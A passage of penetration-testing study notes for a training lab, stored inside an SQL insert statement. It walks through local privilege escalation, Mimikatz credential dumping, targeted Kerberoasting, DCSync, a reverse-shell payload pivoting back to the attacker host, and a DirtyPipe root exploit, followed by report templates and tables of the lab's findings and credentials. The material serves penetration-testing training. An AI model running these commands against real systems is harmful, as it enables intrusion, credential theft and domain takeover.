`backupadm` isn''t a local admin and `whoami /priv` shows nothing useful, so we **hunt for credentials** and find a leftover **`unattend.xml`** (unattended-install answer file) in `C:\panther`:

```powershell
cd c:\panther ; dir
type unattend.xml
# <Username>ilfserveradm</Username>  <Value>Sys26Admin</Value>
```

New local creds: **`ilfserveradm:Sys26Admin`**. This user has **Remote Desktop** rights but isn''t a local admin — so we RDP in and look for a local privilege-escalation path. We find non-standard software at **`C:\Program Files (x86)\SysaxAutomation`**, which has a known local privesc: its scheduled service runs as **SYSTEM**, and if you remove the "run as user" option it runs your task as SYSTEM.

**Steps to exploit Sysax:**
1. Create `C:\Users\ilfserveradm\Documents\pwn.bat` containing:
   ```bat
   net localgroup administrators ilfserveradm /add
   ```
2. Open `sysaxschedscp.exe` → **Setup Scheduled/Triggered Tasks** → **Add task (Triggered)**.
3. Set the monitored folder to `C:\Users\ilfserveradm\Documents`.
4. Check **Run task if a file is added to the monitor folder**.
5. **Run any other Program** → choose `pwn.bat`.
6. **Uncheck** "Login as the following user to run task" → Finish → Save.
7. Trigger it by dropping a new `.txt` file into the monitored folder.

Confirm we''re now a local admin:

```cmd
net localgroup administrators
# ... ilfserveradm   (added)
```

## 10.8 Post-Exploitation Pillaging with Mimikatz

Now a local admin on `MS01`, we pillage more secrets. We note two interesting files in `C:\` (`budget_data.xlsx`, `Inlanefreight.kdbx`) worth flagging to the client. Then **Mimikatz** elevates to a SYSTEM token and dumps LSA secrets:

```cmd
mimikatz.exe
privilege::debug
token::elevate
lsadump::secrets
```

The dump shows a `DefaultPassword` secret (`DBAilfreight1!`) with no username — it belongs to an **autologon** account, so we query the registry for the matching username:

```powershell
Get-ItemProperty -Path ''HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\'' -Name "DefaultUserName"
# DefaultUserName : mssqladm
```

New credential pair: **`mssqladm:DBAilfreight1!`**. We also run **LaZagne** (browser/credential dumper — no luck here) and **Inveigh** (LLMNR/NBNS/mDNS spoofer + SMB capture) to grab NTLMv2 hashes from network poisoning:

```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y
# captures NTLMv2 for ACADEMY-AEN-DEV\mpalledorous ...
```

We now hold `mssqladm:DBAilfreight1!` and continue toward domain compromise.

---

# 11. Active Directory Compromise

We hold **`mssqladm:DBAilfreight1!`**. BloodHound shows this account has **`GenericWrite`** over the user **`ttimmons`** — enough to chain our way to a group that can run **DCSync** and dump every password hash in the domain.

## 11.1 Targeted Kerberoasting with GenericWrite

**`GenericWrite`** lets us modify an attribute on `ttimmons` — specifically, give it a fake **SPN**. Once it has an SPN, we can Kerberoast *that specific user* and crack their password offline. This is **targeted Kerberoasting**.

From DEV01 (PowerView loaded), build a PSCredential for `mssqladm` so we don''t have to RDP again, then set a fake SPN on `ttimmons`:

```powershell
$SecPassword = ConvertTo-SecureString ''DBAilfreight1!'' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential(''INLANEFREIGHT\mssqladm'', $SecPassword)
Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname=''acmetesting/LEGIT''} -Verbose
```

> Note the fake SPN (`acmetesting/LEGIT`) in your log — **delete it afterward** and record it in the report appendix.

Now request and crack the ticket. From the attack host, Impacket''s `GetUserSPNs.py` requests `ttimmons`''s ticket, then Hashcat cracks it:

```shell
proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
# copy the $krb5tgs$... hash to ttimmons_tgs, then:
hashcat -m 13100 ttimmons_tgs /usr/share/wordlists/rockyou.txt
# Status: Cracked  -> we now have ttimmons''s password
```

## 11.2 Abusing GenericAll Over a Group

With `ttimmons` cracked, BloodHound shows `ttimmons` has **`GenericAll`** over the **`SERVER ADMINS`** group — full control, including the ability to **add members**. And `SERVER ADMINS` holds **`GetChanges`/`GetChangesAll`** rights, which allow the **DCSync** attack. So the plan is: **add `ttimmons` to `SERVER ADMINS`**, inheriting DCSync rights.

Build a PSCredential for `ttimmons`, then add the user to the group:

```powershell
$timpass = ConvertTo-SecureString ''<ttimmons-password>'' -AsPlainText -Force
$timcreds = New-Object System.Management.Automation.PSCredential(''INLANEFREIGHT\ttimmons'', $timpass)
$group = Convert-NameToSid "Server Admins"
Add-DomainGroupMember -Identity $group -Members ''ttimmons'' -Credential $timcreds -verbose
```

> Adding yourself to a privileged group is a config change — **note it and remove `ttimmons` from the group** at the end.

## 11.3 DCSync Attack with secretsdump

**DCSync** impersonates a domain controller and asks it to replicate account secrets — letting us pull **every NTLM hash in the domain**, including `krbtgt` and `Administrator`, without ever touching the DC''s disk. Impacket''s `secretsdump.py` does it (`-just-dc-ntlm` = only NTLM hashes):

```shell
proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm
# Administrator:500:...:fd1f7e55...e6afa2:::
# krbtgt:502:...:b9362dfa...58ac:::
# inlanefreight.local\avazquez:1716:...:762cbc5e...909f:::
# ... (every domain account)
```

We now have the **Administrator NTLM hash** → effectively **Domain Admin**. We''ve gone from an anonymous internet attacker to full domain compromise.

> **After Domain Admin — add value:** dump the full NTDS for a password-strength analysis; prove access by RDP''ing to the DC and screenshotting `hostname`/`whoami`/`ipconfig /all`; audit AD; and (with permission) test the client''s alerting by adding a controlled account to Domain/Enterprise Admins to see if they detect it. **Give the client credit** for anything they *do* catch — it builds goodwill.

---

# 12. Post-Exploitation (After Domain Admin)

Reaching Domain Admin is often the *start* of the valuable work, not the end. What we do afterward is what sets a good report apart. (The client also specifically asked us to try to reach the **`172.16.9.0/23`** management network — Domain Admin should *not* automatically grant that.)

## 12.1 Domain Password Analysis (Cracking NTDS)

After dumping the **NTDS** database, crack the hashes offline with Hashcat (all rules/wordlists), then run a tool like **DPAT** (Domain Password Audit Tool) to produce metrics for the report. This backs up the "Weak AD Passwords" finding with hard numbers:

- Number of hashes obtained and cracked (and the percentage)
- Top 10 passwords
- Password-length breakdown
- How many **Domain Admin** / **Enterprise Admin** passwords cracked

## 12.2 Active Directory Security Audit (PingCastle)

**PingCastle** scores the domain''s overall security posture and lists best-practice fixes. Pulling recommendations from its report into our appendix is "above and beyond" work that demonstrates deep understanding and builds client goodwill (repeat business, referrals).

## 12.3 Hunting for Sensitive Data/Hosts

With Domain Admin we can read almost anything. We revisit the file shares to demonstrate impact — but **responsibly**: for sensitive shares, screenshot only the *file listing*, don''t open/exfiltrate real files. Connect to the DC with the Administrator hash (pass-the-hash) via evil-winrm:

```shell
proxychains evil-winrm -i 172.16.8.3 -u administrator -H fd1f7e55...e6afa2
```

Inside the `IT\Private\Networking` share we find **SSH private keys for three users**. On the DC''s `ipconfig /all` we see a **second NIC on `172.16.9.3`** — the DC bridges into the protected management network. A PowerShell ping sweep finds a live host **`172.16.9.25`**:

```powershell
1..100 | % {"172.16.9.$($_): $(Test-Connection -count 1 -comp 172.16.9.$($_) -quiet)"}
# 172.16.9.25: True
```

Download the SSH keys to use against it:

```text
download "C:\Department Shares\IT\Private\Networking\ssmallsadm-id_rsa" /tmp/ssmallsadm-id_rsa
```

## 12.4 The Double Pivot — Reaching MGMT01

The management host `172.16.9.25` (MGMT01) is **two hops away**. Our goal is to SSH straight into it from our attack host through a chain: **Attack host → dmz01 → DC01 → MGMT01**.

**Step 1 — Get a Meterpreter shell on `dmz01`** (ELF payload as before), then add a reverse port-forward so `dmz01:1234` relays to our handler on 8443:

```shell
# in the dmz01 meterpreter session:
portfwd add -R -l 8443 -p 1234 -L 10.10.14.15
```

**Step 2 — Payload for the DC that calls back to `dmz01`** (which relays to us):

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.8.120 -f exe -o dc_shell.exe LPORT=1234
```

**Step 3 — Upload `dc_shell.exe` to the DC** (via evil-winrm `upload`), start a second `multi/handler` on 8443, and run it. We catch a Meterpreter session as **`INLANEFREIGHT\Administrator`** on `DC01`.

**Step 4 — Route to the management subnet and start a SOCKS proxy:**

```shell
# in the DC meterpreter session:
run autoroute -s 172.16.9.0/23
background
# then:
use auxiliary/server/socks_proxy
set srvport 9050
set version 4a
run
```

**Step 5 — Point ProxyChains at port 9050**, confirm reachability, then SSH into MGMT01 with the harvested key (the `ssmallsadm` key works; remember `chmod 600`):

```shell
proxychains nmap -sT -p 22 172.16.9.25
proxychains ssh -i ssmallsadm-id_rsa ssmallsadm@172.16.9.25
```

We''re now on **MGMT01**, the "crown jewels" host.

## 12.5 DirtyPipe Privilege Escalation (CVE-2022-0847)

On MGMT01 we check the kernel and find it''s likely vulnerable to **DirtyPipe (CVE-2022-0847)** — a kernel bug that lets an unprivileged user overwrite data in read-only files/root processes.

```shell
uname -a
# Linux MGMT01 5.10.0-051000-generic ...
```

We paste the exploit source into a file with Vim, compile it (gcc is present), and see it needs a **SUID binary** to target:

```shell
gcc dirtypipe.c -o dirtypipe
chmod +x dirtypipe
./dirtypipe          # Usage: ./dirtypipe SUID
```

Find a SUID binary, then run the exploit against it to pop a root shell:

```shell
find / -perm -4000 2>/dev/null
./dirtypipe /usr/lib/openssh/ssh-keysign
# [+] popping root shell..
# id -> uid=0(root)
```

We''re **root on MGMT01** — fulfilling the client''s goal of reaching their most protected data.

## 12.6 Data Exfiltration & Domain Trusts

Two more value-adds the module mentions:

- **Data Exfiltration Simulation:** Some clients want to test their **Data Loss Prevention (DLP)**. Work with them on what data matters, use **mock data** (never real sensitive files on your box), and try various exfil channels to see what gets detected.
- **Attacking Domain Trusts:** If in scope, enumerate and abuse **trust relationships** (child→parent, intra-forest, external forest). Sometimes a well-hardened domain can be fully compromised *through* a weaker trusted domain — a very valuable thing to show the client. Always confirm the trusted domain is in scope first.

> **Closing thought:** Racing to Domain Admin and stopping there helps no one. The post-DA work — audits, password analysis, sensitive-data access, trust abuse, detection testing — is what proves the test''s worth and keeps clients coming back.

---

# 13. Engagement Closeout

Testing is over — but the engagement isn''t. These final steps are what make you look professional and keep the client happy.

## 13.1 Attack Path Recap

Write out your **attack path from start to finish** — the clean "path of least resistance," not every dead end. This helps you (a) visualize the chain, (b) make sure you didn''t miss anything, and (c) drop a narrative summary into the report. For this engagement, the recap is:

```text
External scan → DNS zone transfer (subdomains) → Command Injection on monitoring (webdev)
→ Socat reverse shell → aureport creds (srvadm) → sudo openssl (root SSH key) → root on dmz01
→ SSH pivot → NFS pillage web.config (DNN admin) → DNN xp_cmdshell / ASPX shell on DEV01
→ PrintSpoofer (SYSTEM) → secretsdump (hporter domain creds)
→ BloodHound: ForceChangePassword ssmalls → share hunt (backupadm)
→ WinRM MS01 → unattend.xml (ilfserveradm) → Sysax privesc (local admin) → Mimikatz (mssqladm)
→ GenericWrite ttimmons (targeted Kerberoast) → GenericAll Server Admins → DCSync (Domain Admin)
→ Double pivot to MGMT01 → DirtyPipe (root, crown jewels)
```

Some firms write the whole report as a narrative walkthrough; either way, keep this recap handy for when the client asks "how did you get X?"

## 13.2 Structuring Findings

Ideally you''ve been **noting findings as you go**, with command output and screenshots, structured so they drop straight into the report. Keep a **prioritized findings list (highest → lowest risk)** — it''s useful to send the client at the end of testing and makes report-writing fast. Gather *all* evidence **before** you lose access; you don''t want to ask the client to re-enable access just to grab a screenshot.

## 13.3 Post-Engagement Cleanup

For a real engagement, keep a running log of **every** scan, attack attempt, file placed, and change made (accounts created, config tweaks, fake SPNs, group adds). Before closing:

- **Delete** everything you uploaded (tools, shells, payloads, notes).
- **Revert** every change (remove `ttimmons` from Server Admins, delete the `acmetesting/LEGIT` SPN, undo `GatewayPorts yes`, etc.).
- Even if cleanup succeeds, still **document every change** in the report appendix.
- **Retain your logs** for a while after — the client may need to correlate alerts with your activity.

## 13.4 Client Communication & Project Closeout

**Tell the client when testing ends** so they know any new odd activity isn''t you. Give a firm report-delivery date and a quick recap of findings if asked — they should never be *blindsided* by a high-risk finding in the report. Expect a **report review meeting**. If retesting is in the SoW, agree a timeline for remediation. Internally, your firm will archive the report/data, hold a **lessons-learned** debrief, maybe a sales questionnaire, and handle invoicing.

---

# 14. Beyond This Module

Finishing this module (and the path) is a big achievement — roughly **250 targets hacked, 400+ sections, 500+ questions, 750,000+ words**. Next steps to keep growing:

- **Redo this lab without the walkthrough** — you in the driver''s seat, taking full notes and writing a commercial-grade report.
- Write down concepts you feel weak in (a "Concept Review List") and drill them using Global Search to find the sections.
- **Practice on the main HTB platform** — Starting Point (Tiers 0–2), Tracks (topic-focused), and **Pro Labs** (the most realistic, enterprise-style environments — approach them like real pentests).
- **Give back** — help in Discord, write blog/YouTube write-ups, share tips. Teaching cements your own learning.
- **Build soft skills** — communication, presentation, writing, ethics — and start applying for roles (conferences, LinkedIn/Indeed, communities, HTB Talent Search).

---

# 15. Appendix A — Writing Proper Documentation (for CTFs & Reports)

This is the part that turns "I hacked a box" into "I can prove it and explain it." Good documentation wins CTF points, passes exams (OSCP/CPTS), and is the actual deliverable clients pay for.

## 15.1 Why Documentation Matters

In a CTF or exam you usually must **prove each step**, not just submit a flag — a screenshot of the flag *plus* the command that got it. In a real pentest, the **report is the product**: the client never watched you work, so your write-up is the only thing they can act on. Good notes also protect you (an activity log to match against their alerts) and save you from re-doing work when you get stuck. The habit is simple: **document as you go**, never at the end from memory.

> **Golden rule:** If it isn''t written down with evidence, it didn''t happen. Screenshot the command *and* its output together, and include the target IP/hostname in the shot.

## 15.2 Folder & Note Structure to Set Up First

Set this up **before** you start, so evidence lands in the right place automatically:

```text
ENGAGEMENT-NAME/
├── scope.txt                 # IPs, ranges, domains, rules
├── notes.md                  # your running log (this file''s style)
├── creds.md                  # every credential found (see Appendix C)
├── findings/                 # one file per finding
├── evidence/
│   ├── scans/                # nmap, nessus, ffuf, wpscan output
│   ├── screenshots/          # named like 01_cmdinjection_webdev.png
│   └── loot/                 # pillaged configs, hashes, keys
└── report/                   # draft report + final PDF
```

Name screenshots so they sort in attack order (`01_...`, `02_...`) and describe what they show. Keep a **credentials table** and a **findings table** updated live.

## 15.3 PDF-Style Report Template (Copy/Paste)

A professional report (the kind you''d export to PDF) usually has these sections. Use this skeleton for CTF/exam write-ups too — graders love structure:

```markdown
# Penetration Test Report — <Client/Box Name>

## 1. Executive Summary
   - Plain-English overview for management (no jargon).
   - What we tested, the overall risk rating, and the 2–3 biggest problems.

## 2. Scope & Methodology
   - In-scope targets (IPs, ranges, domains) and testing window.
   - Methodology/standard followed (e.g., PTES, OWASP).

## 3. Findings (one subsection each, highest risk first)
   ### 3.1 <Finding Title>  — Risk: Critical/High/Medium/Low
   - Description:   what the issue is, in plain English
   - Affected:      host/URL/parameter
   - Evidence:      command + screenshot/output (redact secrets)
   - Impact:        what an attacker gains
   - Reproduction:  numbered steps to reproduce
   - Remediation:   how to fix it

## 4. Attack Path Narrative
   - The clean start-to-finish chain (see 13.1), with screenshots.

## 5. Appendices
   - A: Changes made during testing (accounts, SPNs, configs) to revert
   - B: Full findings table
   - C: Credentials/hashes discovered
   - D: Tool output / password-analysis metrics (DPAT, PingCastle)
```

## 15.4 How to Write a Single Finding (Example)

Here is one finding written the "proper" way, using the Command Injection from this lab. Copy this shape for every finding:

```markdown
### 3.1 OS Command Injection — Risk: Critical

**Affected:** http://monitoring.inlanefreight.local/ping.php (ip parameter)

**Description:**
The connection-test feature passes user input into a shell command without
sanitisation. A blacklist of operators and keywords exists but is bypassable.

**Evidence:**
Request:
    GET /ping.php?ip=127.0.0.1%0a''i''d
Response:
    uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
(see evidence/screenshots/01_cmdinjection_webdev.png)

**Impact:**
Arbitrary command execution as the webdev user on a host bridged into the
internal 172.16.8.0/23 network, enabling a foothold and internal pivoting.

**Reproduction:**
1. Log in to the console (admin:12qwaszx).
2. Submit the request above (newline %0a bypasses the operator filter;
   single-quoting a word, e.g. ''i''d, bypasses the keyword filter;
   ${IFS} substitutes for blocked spaces).
3. Observe command output in the response.

**Remediation:**
- Do not pass user input to a shell. Use a safe library call for ICMP.
- If shell use is unavoidable, use an allowlist (validate the input is a
  valid IP) and parameterised execution; never rely on a denylist.
```

> **Risk ratings in short:** *Critical* = full compromise/RCE; *High* = serious data exposure or privilege gain; *Medium* = meaningful weakness needing other conditions; *Low* = minor/hardening; *Info* = best-practice note.

## 15.5 Turning Your Markdown Notes into a PDF

Once your notes/report are in Markdown, convert to a clean PDF for submission:

```shell
# Pandoc (needs a LaTeX engine like texlive/wkhtmltopdf installed)
pandoc report.md -o report.pdf

# With a nicer look:
pandoc report.md -o report.pdf --toc --from gfm -V geometry:margin=1in
```

Other easy options: **VS Code "Markdown PDF" extension**, **Typora** (export → PDF), or **Obsidian** (export to PDF). For CTF platforms, a Markdown or PDF write-up with screenshots embedded is usually ideal.

---

# 16. Appendix B — Full Findings List (Running Table)

Keep this table updated *as you test* — it''s the backbone of the report and the quickest thing to hand a client at the end.

| # | Finding | Risk | Host / Location | Evidence (what proves it) |
|---|---------|------|-----------------|---------------------------|
| 1 | SMTP VRFY User Enumeration | Low | `25/tcp` (Postfix) | `VRFY root` → `252` |
| 2 | Unnecessary Exposed Service (rpcbind) | Low | `111/tcp` | `rpcinfo` output |
| 3 | Insecure Direct Object Reference (IDOR) | Medium | `careers` `/profile?id=` | other users'' profiles load |
| 4 | HTTP Verb Tampering | High | `dev` `/upload.php` | TRACK + spoofed header reveals form |
| 5 | Unrestricted File Upload | High | `dev` `/uploads` | `.php` shell uploaded as `image/png` |
| 6 | Directory Listing Enabled | Low | `dev` `/uploads` | 301 browsable dir |
| 7 | Local File Inclusion (LFI) | High | `ir` mail-masta plugin | `/etc/passwd` via `pl=` |
| 8 | Weak WordPress Admin Credentials | High | `ir` `/wp-login.php` | `ilfreightwp:password1` |
| 9 | SQL Injection | High | `status` `searchitem` | sqlmap confirms, dumps DBs |
| 10 | Cross-Site Scripting (Blind/Stored) | High | `support` `/ticket.php` | admin cookie stolen → dashboard |
| 11 | SSRF to Local File Read | High | `tracking` PDF generator | `/etc/passwd` in PDF |
| 12 | Misconfigured GitLab Instance | High | `gitlab` | open registration reveals shopdev2 |
| 13 | XML External Entity (XXE) Injection | High | `shopdev2` `/checkout.php` | `/etc/passwd` via entity |
| 14 | OS Command Injection | Critical | `monitoring` `/ping.php` | RCE as `webdev` |
| 15 | Insecure File Shares (anon NFS) | High | `172.16.8.20:/DEV01` | anonymous mount |
| 16 | Sensitive Data on File Shares | High | NFS web.config, SMB scripts | hardcoded creds in files |
| 17 | Excessive AD Group Privileges (Domain Users RDP) | Medium | `DEV01` | BloodHound CanRDP |
| 18 | Weak Kerberos Config (Kerberoasting) | Medium | domain SPN accounts | crackable TGS |
| 19 | Weak Active Directory Passwords | Medium | domain-wide | spray `Welcome1` hits 2 users |
| 20 | Passwords in AD Description Field | Low | `frontdesk` | `ILFreightLobby!` in Description |
| 21 | Local Privilege Escalation (Sysax) | High | `MS01` | `ilfserveradm` → local admin |
| 22 | Credentials in unattend.xml | Medium | `MS01` `C:\panther` | `ilfserveradm:Sys26Admin` |
| 23 | DCSync → Domain Compromise | Critical | `DC01` | all NTLM hashes dumped |
| 24 | Kernel Vuln DirtyPipe (CVE-2022-0847) | Critical | `MGMT01` | root shell |

*(PrintNightmare could be added as High if exploited. "Sudo openssl misconfig" and the SeImpersonate path are also noteworthy root-cause items.)*

---

# 17. Appendix C — Credentials Harvested (Cheat Sheet)

Track every credential the moment you find it — password reuse is the single most reliable attack multiplier, so you''ll constantly re-try these across hosts/services.

| Credential | Where Found | Used For |
|------------|-------------|----------|
| `admin:12qwaszx` | hydra brute force | `monitoring` login |
| `srvadm:ILFreightnixadm!` | `aureport` audit logs on dmz01 | `su` / SSH on dmz01 |
| root SSH private key (`dmz01_key`) | `sudo openssl` read of `/root/.ssh/id_rsa` | root SSH + pivots |
| `Administrator:D0tn31Nuk3R0ck$$@123` | NFS `web.config` | DNN admin → RCE |
| local Administrator NTLM hash | secretsdump (SAM) on DEV01 | pass-the-hash to DEV01 |
| `hporter:Gr8hambino!` | LSA secret (secretsdump) | first domain user; BloodHound path |
| `ssmalls:Str0ngpass86!` | we set it via ForceChangePassword | share enumeration |
| `backupadm:<cracked>` | `SQL Express Backup.ps1` on IT share | WinRM to MS01 |
| `account:L337^p@$$w0rD` | `adum.vbs` on SYSVOL | likely stale (spray candidate) |
| `ilfserveradm:Sys26Admin` | `unattend.xml` on MS01 | RDP + Sysax privesc |
| `mssqladm:DBAilfreight1!` | Mimikatz LSA (autologon) | GenericWrite → ttimmons |
| `ttimmons:<cracked>` | targeted Kerberoast | GenericAll → Server Admins |
| `frontdesk:ILFreightLobby!` | AD Description field | (not useful) |
| Domain NTLM hashes (incl. Administrator, krbtgt) | DCSync | Domain Admin / Golden Ticket |
| `ssmallsadm` SSH key | DC `IT\Private\Networking` share | SSH into MGMT01 |

> **Reuse reminder:** Every time you find a password, try it against *every* account and service. That''s how one weak password becomes full domain compromise.

---

*End of notes. Built in the style of the abrar898 Linux PrivEsc notes: numbered TOC, plain-English explanations per heading, step-by-step commands, and documentation guidance for CTFs/reports at the end.*', NULL, 'PUBLISHED', 'PUBLIC', 64, 'cmvcsa9i0000hidr0sh1y58oz', 'cmvcr40dj0000idhkp489xa3k', to_timestamp(1792440783.827), to_timestamp(1792440783.827), NULL, NULL)
ON CONFLICT ("slug") DO UPDATE SET "title" = EXCLUDED."title", "contentMarkdown" = EXCLUDED."contentMarkdown", "contentHtml" = EXCLUDED."contentHtml", "description" = EXCLUDED."description", "status" = EXCLUDED."status", "updatedAt" = EXCLUDED."updatedAt";
